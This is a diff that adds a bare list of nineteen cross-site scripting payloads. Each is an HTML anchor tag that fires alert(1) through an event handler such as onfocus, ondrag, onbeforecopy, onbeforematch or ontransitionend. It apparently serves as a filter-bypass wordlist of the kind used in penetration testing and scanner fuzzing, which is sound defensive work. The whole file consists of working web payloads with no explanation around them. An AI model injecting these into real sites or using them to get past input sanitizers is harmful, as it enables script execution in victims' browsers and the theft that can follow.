@@ -1,0 +1,19 @@
+<a autofocus onfocus=alert(1) href></a>
+<a autofocus onfocusin=alert(1) href></a>
+<a contenteditable onbeforeinput=alert(1)>test
+<a draggable="true" ondrag="alert(1)" style=display:block>test</a>
+<a draggable="true" ondragend="alert(1)" style=display:block>test</a>
+<a draggable="true" ondragenter="alert(1)" style=display:block>test</a>
+<a draggable="true" ondragexit="alert(1)" style=display:block>test</a>
+<a draggable="true" ondragleave="alert(1)" style=display:block>test</a>
+<a draggable="true" ondragstart="alert(1)" style=display:block>test</a>
+<a id=x onbeforematch=alert(1) hidden=until-found>
+<a id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></a>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<a onbeforepaste=alert(1)>XSS</a>
+<a onblur=alert(1) id=x tabindex=1 style=display:block>test</a><input value=clickme>
+<a onclick="alert(1)" style=display:block>test</a>
+<a oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
